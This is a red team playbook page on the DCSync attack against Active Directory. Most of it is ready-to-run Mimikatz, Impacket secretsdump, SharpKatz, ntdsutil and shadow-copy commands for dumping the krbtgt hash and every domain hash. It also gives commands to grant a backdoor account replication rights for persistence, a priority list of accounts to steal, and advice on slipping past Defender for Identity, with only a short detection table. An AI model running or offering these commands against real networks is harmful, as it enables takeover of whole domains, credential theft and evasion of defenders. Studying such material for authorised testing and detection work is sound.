# DCSync Attack

> **MITRE ATT&CK**: Credential Access > T1003.006 - OS Credential Dumping: DCSync
> **Platforms**: Windows (Active Directory)
> **Required Privileges**: Replicating Directory Changes + Replicating Directory Changes All
> **OPSEC Risk**: Medium-High

## Strategic Overview

DCSync is the gold standard for domain credential extraction. It abuses the MS-DRSR
(Directory Replication Service Remote) protocol to request credential data from a Domain
Controller, exactly as a legitimate DC would during replication. No malware needs to run
on the DC itself -- you replicate credentials to any domain-joined machine where you have
the required privileges.

**As a Red Team Lead, DCSync is your primary extraction method after achieving Domain Admin:**
- Extract the krbtgt hash for Golden Ticket persistence
- Harvest all domain user NTLM hashes for password analysis
- Extract trust account keys for cross-forest movement
- Obtain specific high-value account credentials without touching the DC

**Accounts with DCSync rights by default:**
- Domain Admins
- Enterprise Admins
- Domain Controllers (computer accounts)
- Administrators (built-in)
- Any principal explicitly granted Replicating Directory Changes + Replicating Directory Changes All

**Key insight:** Attackers who compromise an account with DCSync rights own the entire
domain. Conversely, granting DCSync ACLs is a common persistence mechanism that is
difficult to detect without ACL auditing.

## Technical Deep-Dive

### 1. Mimikatz DCSync

```
# Single user extraction (most common - surgical approach)
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:corp\da_admin" "exit"

# Full domain dump (noisy - all user hashes)
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"

# Specific user with GUID targeting
mimikatz.exe "lsadump::dcsync /domain:corp.local /guid:{GUID}" "exit"

# Output includes:
# - NTLM hash
# - LM hash (if stored)
# - Password history (supplementalCredentials)
# - Kerberos keys (AES256, AES128, DES)
```

### 2. Impacket secretsdump

```bash
# Full DCSync dump
secretsdump.py corp.local/admin:Password123@dc01.corp.local

# DCSync only (skip SAM/LSA)
secretsdump.py corp.local/admin:Password123@dc01.corp.local -just-dc

# Single user DCSync
secretsdump.py corp.local/admin:Password123@dc01.corp.local -just-dc-user krbtgt

# NTLM hashes only (skip Kerberos keys)
secretsdump.py corp.local/admin:Password123@dc01.corp.local -just-dc-ntlm

# With pass-the-hash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@dc01.corp.local -just-dc

# With Kerberos authentication (no password on wire)
secretsdump.py -k -no-pass corp.local/admin@dc01.corp.local -just-dc

# Output to file
secretsdump.py corp.local/admin:Password123@dc01.corp.local -just-dc -outputfile domain_hashes
# Creates: domain_hashes.ntds, domain_hashes.ntds.kerberos, domain_hashes.ntds.cleartext
```

### 3. SharpKatz (.NET In-Memory)

```
# Via Cobalt Strike
execute-assembly SharpKatz.exe --Command dcsync --User krbtgt --Domain corp.local --DomainController dc01.corp.local

# Single user
execute-assembly SharpKatz.exe --Command dcsync --User Administrator --Domain corp.local --DomainController dc01.corp.local
```

### 4. NTDS.dit Direct Extraction (Alternative to DCSync)

```cmd
# Using ntdsutil (runs on the DC itself)
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds_dump" q q
# Creates: c:\temp\ntds_dump\Active Directory\ntds.dit
# Creates: c:\temp\ntds_dump\registry\SYSTEM
# Creates: c:\temp\ntds_dump\registry\SECURITY

# Parse offline
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL

# Using Volume Shadow Copy on DC
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.bak
vssadmin delete shadows /shadow={GUID} /quiet

# Using diskshadow (scriptable alternative)
# Create script: diskshadow_script.txt
# set context persistent nowriters
# add volume c: alias someAlias
# create
# expose %someAlias% z:
# exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit
# delete shadows volume %someAlias%
# reset
diskshadow /s diskshadow_script.txt
```

### 5. Checking and Granting DCSync Rights

```powershell
# Check who has DCSync rights (recon)
Import-Module ActiveDirectory
(Get-Acl "AD:\DC=corp,DC=local").Access |
  Where-Object {$_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or
                $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"} |
  Select IdentityReference, ObjectType

# Using PowerView
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.ObjectAceType -match "Replication"}

# Grant DCSync rights (persistence mechanism)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity backdoor_user -Rights DCSync

# GUIDs for DCSync rights:
# 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes
# 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes-All
# 89e95b76-444d-4c62-991a-0facbeda640c = DS-Replication-Get-Changes-In-Filtered-Set
```

### 6. High-Value DCSync Targets

```
# Priority extraction order:
1. krbtgt              - Golden Ticket creation
2. Administrator       - Built-in domain admin
3. Trust accounts      - DOMAIN$, cross-forest trust keys
4. Service accounts    - Often have broad access, weak passwords
5. All users (-all)    - Password analysis, spray lists

# Trust account extraction for cross-forest attacks
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:PARTNER$" "exit"
# Use trust key for inter-realm TGT forging
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| Directory replication request | Event ID 4662 | Properties: Replicating Directory Changes |
| Replication from non-DC IP | Network monitoring | DRS-RPC from workstation IP to DC |
| Defender for Identity alert | MDI | Suspected DCSync attack (replication) |
| Abnormal replication traffic | Zeek/IDS | MS-DRSR traffic from non-DC source |
| ACL modification | Event ID 5136 | DCSync rights granted to unexpected principal |

### Evasion Techniques

1. **Perform from a compromised DC** - Replication between DCs is expected and normal
2. **Target specific accounts** - Avoid /all; extract only what you need to reduce log volume
3. **Use Kerberos auth** - Avoid NTLM authentication to the DC (secretsdump -k)
4. **Timing** - Execute during legitimate replication windows or business hours
5. **Avoid Defender for Identity** - If MDI is deployed, DCSync from a DC is the only safe option
6. **Use existing DA sessions** - Leverage already-authenticated sessions rather than new logons

### OPSEC Considerations for Leads

```
# Before performing DCSync, verify:
# 1. No Defender for Identity / ATA sensors on DCs
# 2. Check if DRS traffic is monitored (unusual source detection)
# 3. Understand the replication topology to blend in
# 4. Consider extracting only critical accounts (krbtgt + specific targets)
# 5. If possible, perform from a compromised DC for maximum stealth
```

## Cross-References

- [LSASS Dumping](lsass-dumping.md) - Alternative credential extraction from endpoints
- [SAM & LSA Secrets](sam-lsa-secrets.md) - Local credential stores
- [Kerberos Attacks](kerberos-credential-attacks.md) - Use krbtgt hash for Golden Ticket
- [Password Cracking](password-cracking.md) - Crack extracted NTLM hashes
- ../12-active-directory-deep-dive/ - Full AD attack methodology
- ../09-persistence/ - DCSync ACL as persistence mechanism

## References

- https://attack.mitre.org/techniques/T1003/006/
- https://adsecurity.org/?p=1729
- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/
